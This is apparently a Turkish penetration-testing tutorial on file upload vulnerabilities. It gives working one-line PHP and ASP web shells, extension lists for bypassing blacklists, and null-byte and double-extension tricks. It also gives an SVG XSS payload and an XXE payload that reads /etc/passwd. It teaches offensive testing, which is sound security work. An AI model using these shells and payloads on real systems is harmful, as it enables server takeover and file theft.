# Dosya Yükleme Saldırıları
Dosya yükleme zafiyetlerinin en temel nedeni, yüklenen dosyaların türü ve içeriğinin yeterli düzeyde doğrulanmamasıdır. Bu durumda saldırganlar herhangi bir dosya tipini yükleyebilir ve backend sunucuda zararlı kod çalıştırabilir. Bazı uygulamalar yalnızca belirli dosya türlerine izin verir. Ancak bu durumda bile zafiyetler söz konusu olabilir. Örneğin:
- Dosya yükleme üzerinden XSS veya XXE gibi farklı açıkların tetiklenmesi.
- Arka uç sunucuya yönelik DoS (Denial of Service) saldırılarının gerçekleştirilmesi.

# Dosya Yükleme Zafiyetlerinin Sömürüsü
Zafiyetin istismar edilebilmesi için ilk adım, uygulamanın hangi dil ve platform üzerinde çalıştığının tespit edilmesidir. zararlı script’ler, yalnızca sunucunun çalıştığı programlama diliyle uyumlu olduğunda kullanılabilir. Genellikle bu tespit, sayfa uzantıları üzerinden yapılabilir (.php, .asp, .aspx vb.). Ancak bazı modern framework’lerde web routes nedeniyle bu uzantılar gizlenmiş olabilir. Uygulama PHP tabanlı olduğunu varsayalım, dosya yükleme fonksiyonunun php uzantılı dosyaları kabul edip etmediğini test etmek için minimal bir reverse shell yüklenebilir:
```php
<?=`$_GET[0]`?> // 0 parametresini URL'den alır ve değeri işletim sistemi komutu olarak çalıştırır
```

Veya ASP için aşağıdaki reverse shell kullanılabilir:
```c#
<% eval request('cmd') %>
```

## İstemci Tarafı Dosya Uzantısı Kontrolü
İstemci tarafında çalışan her kod bizim kontrolümüzdedir. Web sunucusu front-end kodunu gönderir, ancak kod tarayıcıda çalıştırılır. Eğer back-end tarafında doğrulama yoksa, teorik olarak herhangi bir dosya türünü yükleyebiliriz.

## Back-end Tarafında Dosya Uzantısı Doğrulama
Genellikle iki yaygın yöntem vardır:
- blacklist ve whitelist kontrolü.

Ayrıca, doğrulama dosya tipini veya içerik tipini kontrol edebilir. En zayıf doğrulama yöntemi, sadece dosya uzantısını kara listeye karşı kontrol etmektir. 

### Blacklist
Örnek PHP kodu:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

Bu kod, dosya uzantısını ($extension) alır ve black list uzantıları ile ($blacklist) karşılaştırır. Eğer listede varsa yükleme engellenir.

PHP bütün dosya uzantıları:
```
php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
```

ASP dosya uzantıları:
```
.asp
.aspx
.config
.cer # (IIS <= 7.5)
.asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap
```

### Whitelist
Whitelist Örneği:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Kod, dosya adının whitelisted resim uzantılarını içerip içermediğini regex ile kontrol ediyor. Sorun şu regex yalnızca dosya adının uzantıyı içerip içermediğine bakıyor, dosya adının uzantı ile bitip bitmediğini kontrol etmiyor. Regex sadece dosya adında izin verilen uzantıyı aradığı için, basit bir yöntem double extension kullanmak. Örneğin .jpg izinliyse, dosya adını shell.jpg.php yapabiliriz.

Bazı uygulamalar daha katı regex kullanır:
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }
```

Bu regex yalnızca dosya adının son uzantısını kontrol eder. Önceki saldırı burada işe yaramaz. Ancak bazı durumlarda, web sunucusu konfigürasyonu nedeniyle hala istismar edilebilir.

Örnek Apache Konfigürasyonu:
```
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

#### Character Injection
İzin verilen uzantıdan önce veya sonra bazı karakterler ekleyerek web uygulamasının dosya adını yanlış yorumlamasını sağlayabiliriz.
Örnek karakterler:
``` 
%20, %0a, %00, %0d0a, /, .\, ., …, :
```

Örnek:
- shell.php%00.jpg → PHP 5.X veya daha eski sürümlerde %00 sonrası dosya adı kesilir ve shell.php olarak kaydedilir, whitelist testi geçer.
- Windows sunucularda, kolon : eklenerek benzer bypass sağlanabilir (örn. shell.aspx:.jpg).

### Type Filter
Örnek PHP kodu:
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Burada $type, yüklenen dosyanın Content-Type başlığından alınıyor. Tarayıcılar dosya seçildiğinde Content-Type başlığını otomatik ayarlar (genellikle uzantıya bağlı olarak). Bu, istemci tarafında kontrol edildiği için manipüle edilebilir ve filtre atlanabilir.

#### MIME-Type Kontrolü
İkinci ve daha yaygın yöntem, dosyanın MIME-Type ile kontrol edilmesidir. MIME, dosyanın türünü genel format ve byte yapısına göre belirler. Genellikle dosyanın ilk birkaç byte’ı (Magic Bytes / File Signature) incelenir.
Örnek:
- Dosya GIF87a veya GIF89a ile başlıyorsa GIF kabul edilir.
- Dosya düz metin ile başlıyorsa Text dosyası kabul edilir.

PHP ile MIME-Type kontrolü:
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

MIME-Type ile Content-Type benzer, ancak PHP mime_content_type() fonksiyonunu kullanır.

Örnek olarak PHP web shell’in başına GIF8 eklenebilir.

## XSS (Cross-Site Scripting)
Belirli dosya türleri, Stored XSS açığı oluşturmak için kullanılabilir. Web uygulaması HTML dosyalarına izin veriyorsa, PHP kodu çalıştıramasak bile JavaScript ekleyerek XSS veya CSRF saldırısı gerçekleştirebiliriz. 
SVG dosyaları da XSS için uygundur:
```svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Yüklendiğinde XSS payload tetiklenir.

## XXE (XML External Entity)
Benzer şekilde, XXE saldırıları da gerçekleştirilebilir. SVG veya XML dosyaları kullanarak sunucu dosyalarına erişebiliriz.
Örnek SVG ile /etc/passwd okumak:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Yüklendiğinde ve görüntülendiğinde /etc/passwd içeriği sayfada veya kaynakta görünür.